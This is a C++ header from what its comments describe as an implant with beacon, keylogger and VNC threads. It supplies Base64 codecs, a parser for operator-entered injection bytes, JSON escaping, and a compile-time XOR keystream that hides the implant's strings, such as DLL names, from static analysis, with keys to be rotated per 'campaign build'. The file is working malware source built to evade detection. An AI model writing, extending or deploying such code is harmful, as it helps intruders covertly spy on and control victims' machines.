// ghostcore.hpp — platform-free core primitives, unit-tested by tests/test_core.cpp.
//
// Everything in this header compiles and runs without Windows. That is the
// point: the string codecs, the command-line hex parser and the XS/XSW
// keystream are the parts of the implant most likely to be subtly wrong, and
// until this header existed none of them had a single test — CI only proved
// that the implant compiles. The Windows-facing code (utils.cpp, c2.cpp,
// obfuscate.hpp) keeps thin wrappers over these implementations, so each
// primitive exists exactly once and the pure logic is exercised on a plain
// Linux runner as well as on Windows.
#pragma once

#include <array>
#include <cstdint>
#include <cstdio>
#include <string>
#include <string_view>
#include <vector>

namespace ghost {

// ===========================================================================
// Base64 — RFC 4648 standard alphabet
// ===========================================================================
namespace detail {
constexpr char kB64[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
} // namespace detail

inline std::string Base64Encode(const uint8_t* data, size_t len) {
    std::string out;
    out.reserve(((len + 2) / 3) * 4);
    for (size_t i = 0; i < len; i += 3) {
        uint32_t b = static_cast<uint32_t>(data[i]) << 16;
        if (i + 1 < len) b |= static_cast<uint32_t>(data[i + 1]) << 8;
        if (i + 2 < len) b |= static_cast<uint32_t>(data[i + 2]);
        out.push_back(detail::kB64[(b >> 18) & 0x3F]);
        out.push_back(detail::kB64[(b >> 12) & 0x3F]);
        out.push_back((i + 1 < len) ? detail::kB64[(b >> 6) & 0x3F] : '=');
        out.push_back((i + 2 < len) ? detail::kB64[b & 0x3F]        : '=');
    }
    return out;
}

// Strict decode: padding is legal only as trailing characters of the final
// quartet, and any alphabet byte after a pad is malformed. An empty result
// therefore means "malformed or empty" — callers treat both as a decode
// failure, which is why a corrupt frame surfaces as an auth failure rather
// than as bytes built from garbage. (Background: accepting '=' anywhere used
// to map it to zero and produced bytes from malformed input.)
inline std::vector<uint8_t> Base64Decode(std::string_view b64) {
    // Built once through a magic static, which C++11 guarantees is initialised
    // exactly once even under concurrent entry. The previous shape was
    // `static int inv[256]` guarded by `static bool init`, read-modified with no
    // synchronisation: Base64Decode runs on the beacon, keylog and VNC threads,
    // so two of them could be writing the table while the other decoded with it.
    static const std::array<int, 256> INV = [] {
        std::array<int, 256> t;
        for (int i = 0; i < 256; ++i) t[i] = -1;
        for (int i = 0; i < 64; ++i) t[(unsigned char)detail::kB64[i]] = i;
        t[(unsigned char)'='] = 0;
        return t;
    }();

    std::vector<uint8_t> out;
    if (b64.size() % 4 != 0) return out;
    out.reserve((b64.size() / 4) * 3);
    for (size_t i = 0; i < b64.size(); i += 4) {
        uint32_t block = 0;
        bool sawPad = false;
        for (int j = 0; j < 4; ++j) {
            const char c = b64[i + j];
            if (c == '=') {
                if (j < 2 || i + 4 != b64.size()) return {};
                sawPad = true;
                block <<= 6;
                continue;
            }
            if (sawPad) return {};
            int v = INV[(unsigned char)c];
            if (v < 0) return {};
            block = (block << 6) | static_cast<uint32_t>(v);
        }
        out.push_back(static_cast<uint8_t>((block >> 16) & 0xFF));
        if (b64[i + 2] != '=') out.push_back(static_cast<uint8_t>((block >> 8) & 0xFF));
        if (b64[i + 3] != '=') out.push_back(static_cast<uint8_t>(block & 0xFF));
    }
    return out;
}

// ===========================================================================
// Command-line hex parsing — "48b8c3", "48 b8 c3", "4A b8" all accepted.
// ===========================================================================
// Strict on purpose: the per-handler loops this replaces silently produced
// garbage bytes for malformed input (an odd trailing digit was dropped, a
// non-hex character parsed as zero), so an operator typo became a failed
// injection with no explanation. Returns false and fills `error` instead.
inline bool ParseHexBytes(std::string_view text, std::vector<uint8_t>& out,
                          std::string& error) {
    out.clear();
    error.clear();
    auto hexval = [](char c, int& v) -> bool {
        if (c >= '0' && c <= '9') { v = c - '0'; return true; }
        if (c >= 'a' && c <= 'f') { v = c - 'a' + 10; return true; }
        if (c >= 'A' && c <= 'F') { v = c - 'A' + 10; return true; }
        return false;
    };

    const size_t n = text.size();
    size_t i = 0;
    while (i < n) {
        const char c = text[i];
        if (c == ' ' || c == '\t' || c == '\r' || c == '\n') { ++i; continue; }

        int hi = 0, lo = 0;
        if (!hexval(c, hi)) {
            error = std::string("invalid hex digit '") + c + "'";
            return false;
        }
        if (i + 1 >= n) {
            error = "odd number of hex digits";
            return false;
        }
        if (!hexval(text[i + 1], lo)) {
            error = std::string("invalid hex digit '") + text[i + 1] + "'";
            return false;
        }
        out.push_back(static_cast<uint8_t>((hi << 4) | lo));
        i += 2;
    }

    if (out.empty()) {
        error = "no bytes parsed";
        return false;
    }
    return true;
}

// ===========================================================================
// JSON string escaping (narrow)
// ===========================================================================
inline std::string JsonEscape(std::string_view s) {
    std::string out;
    out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"':  out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\b': out += "\\b";  break;
            case '\f': out += "\\f";  break;
            case '\n': out += "\\n";  break;
            case '\r': out += "\\r";  break;
            case '\t': out += "\\t";  break;
            default:
                if (c < 0x20) {
                    char buf[8];
                    std::snprintf(buf, sizeof(buf), "\\u%04x", c);
                    out += buf;
                } else {
                    out += static_cast<char>(c);
                }
        }
    }
    return out;
}

// ===========================================================================
// XS/XSW keystream — the encryption behind include/obfuscate.hpp
// ===========================================================================
// GHOST_SALT and GHOST_K0..K3 feed every per-string seed. Rotate both before
// each campaign build: rotating re-keys the whole binary, and one recovered
// keystream decrypts exactly one string.
constexpr uint64_t GHOST_SALT = 0x5D3A9F17C4B28E60ull;
constexpr uint8_t GHOST_K0 = 0xA7u;
constexpr uint8_t GHOST_K1 = 0x3Eu;
constexpr uint8_t GHOST_K2 = 0xC1u;
constexpr uint8_t GHOST_K3 = 0x58u;

// splitmix64 — mixing primitive behind the per-string keystream.
// seed = splitmix64(salt ⊕ key ⊕ callsite id); stream byte i is the top byte
// of splitmix64(seed + i·prime), so every byte of every string is independent.
constexpr uint64_t splitmix64(uint64_t x) {
    x += 0x9E3779B97F4A7C15ull;
    x = (x ^ (x >> 30)) * 0xBF58476D1CE4E5B9ull;
    x = (x ^ (x >> 27)) * 0x94D049BB133111EBull;
    return x ^ (x >> 31);
}
constexpr uint64_t ghost_seed(uint32_t id) {
    const uint64_t k = uint64_t(GHOST_K0) | (uint64_t(GHOST_K1) << 8) |
                       (uint64_t(GHOST_K2) << 16) | (uint64_t(GHOST_K3) << 24);
    return splitmix64(GHOST_SALT ^ k ^ (uint64_t(id) * 0x9E3779B97F4A7C15ull));
}
constexpr uint8_t ghost_stream(uint64_t seed, size_t i) {
    return static_cast<uint8_t>(splitmix64(seed + uint64_t(i) * 0xD1B54A32D192ED03ull) >> 56);
}
constexpr uint16_t ghost_stream_w(uint64_t seed, size_t i) {
    return static_cast<uint16_t>(ghost_stream(seed, 2 * i) |
                                 static_cast<uint16_t>(ghost_stream(seed, 2 * i + 1) << 8));
}

// ─── Ciphertext builders for XorStr / XorStrW (include/obfuscate.hpp) ───────
// These exist so the plaintext literal is only ever an argument to a *constant
// expression*. obfuscate.hpp binds a `constexpr` array to the result of these
// calls, which obliges the compiler to evaluate the XOR at compile time and
// leaves the source literal unreferenced — so it is dropped from the object
// file. Before this, whether a site was encrypted at all was left to the
// optimizer's mood: measured against a full release build, GCC 14.3 shipped 3
// of the tripwire's strings in the clear and the CI toolchain shipped all of
// them, while clang shipped 8. That is now a language guarantee, not a hope.
template <size_t N, uint32_t ID>
constexpr std::array<char, N> MakeCipher(const char (&src)[N]) {
    std::array<char, N> out{};
    for (size_t i = 0; i < N; ++i)
        out[i] = static_cast<char>(static_cast<unsigned char>(src[i]) ^ ghost_stream(ghost_seed(ID), i));
    return out;
}

template <size_t N, uint32_t ID>
constexpr std::array<wchar_t, N> MakeCipherW(const wchar_t (&src)[N]) {
    std::array<wchar_t, N> out{};
    for (size_t i = 0; i < N; ++i)
        out[i] = static_cast<wchar_t>(static_cast<unsigned>(src[i]) ^ ghost_stream_w(ghost_seed(ID), i));
    return out;
}

// A volatile zero. Decoding XORs each byte with this value, which changes
// nothing but makes the decoded byte unknowable at compile time — and that is
// the point: with the ciphertext now a true compile-time constant, an
// aggressive optimiser is free to fold the *decode* as well and materialise the
// plaintext. Clang does exactly that for short strings (measured: it emitted
// "wer.dll" as an immediate in the instruction stream), which would put the
// plaintext back into the binary statically — the opposite of what the scheme
// is for. The volatile load is one instruction per byte and cannot be folded
// away, because the compiler cannot know what it reads.
inline volatile uint8_t opaque_zero = 0;

} // namespace ghost
